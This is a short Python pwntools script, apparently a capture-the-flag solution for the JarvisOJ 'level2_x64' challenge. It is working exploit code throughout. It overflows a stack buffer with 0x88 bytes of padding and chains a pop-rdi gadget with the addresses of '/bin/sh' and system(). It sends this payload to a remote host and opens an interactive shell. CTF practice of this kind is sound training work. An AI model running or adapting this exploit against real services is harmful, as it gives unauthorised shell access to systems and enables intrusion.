#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.log_level = 'debug'

elf = ELF('../elf/level2_x64')
sys_addr = elf.symbols['system']
sh_addr = elf.search('/bin/sh').next()

p_rdi_r_addr = 0x00000000004006b3

payload = 'A' * (0x80 + 0x8) + p64(p_rdi_r_addr) + p64(sh_addr) + p64(sys_addr) + p64(0xdeadbeef)

#  io = process('../elf/level2_x64')
io = remote('pwn2.jarvisoj.com', 9882)
io.recvuntil('Input:\n')
io.send(payload)
io.interactive()
io.close()
